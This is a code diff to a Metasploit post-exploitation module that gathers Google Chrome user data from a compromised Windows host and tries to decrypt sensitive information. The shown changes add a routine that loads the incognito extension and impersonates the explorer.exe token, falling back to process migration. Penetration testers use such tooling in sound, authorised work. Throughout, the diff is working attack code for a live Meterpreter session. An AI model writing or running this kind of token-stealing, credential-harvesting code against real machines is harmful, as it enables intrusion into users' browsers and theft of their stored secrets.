@@ -22,7 +22,10 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super(update_info(info,
 			'Name'                 => "Windows Gather Google Chrome User Data Enumeration",
-			'Description'          => %q{This module will collect user data from Google Chrome and attempt to decrypt sensitive information},
+			'Description'          => %q{
+				This module will collect user data from Google Chrome and attempt to decrypt
+				sensitive information.
+			},
 			'License'              => MSF_LICENSE,
 			'Version'              => '$Revision$',
 			'Platform'             => ['windows'],
@@ -31,9 +34,10 @@ class Metasploit3 < Msf::Post
 				[
 					'Sven Taute', #Original (Meterpreter script)
 					'sinn3r',     #Metasploit post module
-					'Kx499',      #x64 support
+					'Kx499'       #x64 support
 				]
 		))
+
 		register_options(
 			[
 				OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
@@ -149,6 +153,30 @@ class Metasploit3 < Msf::Post
 		return true
 	end
 
+	def steal_token
+		current_pid = session.sys.process.open.pid
+		target_pid = session.sys.process["explorer.exe"]
+		return if target_pid == current_pid
+
+		if not session.incognito
+			session.core.use("incognito")
+
+			if not session.incognito
+				print_error("Unable to load incognito")
+				return false
+			end
+		end
+
+		print_status("Impersonating token: #{target_pid.to_s}")
+		begin
+			session.sys.config.steal_token(target_pid)
+			return true
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error("Cannot impersonate: #{e.message.to_s}")
+			return false
+		end
+	end
+
 	def migrate(pid=nil)
 		current_pid = session.sys.process.open.pid
 		if pid != nil and current_pid != pid
@@ -158,7 +186,7 @@ class Metasploit3 < Msf::Post
 			begin
 				session.core.migrate(target_pid)
 			rescue ::Exception => e
-				print_error(e)
+				print_error(e.message)
 				return false
 			end
 		else
@@ -197,8 +225,12 @@ class Metasploit3 < Msf::Post
 		@host_info = session.sys.config.sysinfo
 		migrate_success = false
 
-		# Automatically migrate to explorer.exe
-		migrate_success = migrate if datastore["MIGRATE"]
+		# If we can impersonate a token, we use that first.
+		# If we can't, we'll try to MIGRATE (more aggressive) if the user wants to
+		got_token = steal_token
+		if not got_token and datastore["MIGRATE"]
+			migrate_success = migrate
+		end
 
 		host = session.session_host
 
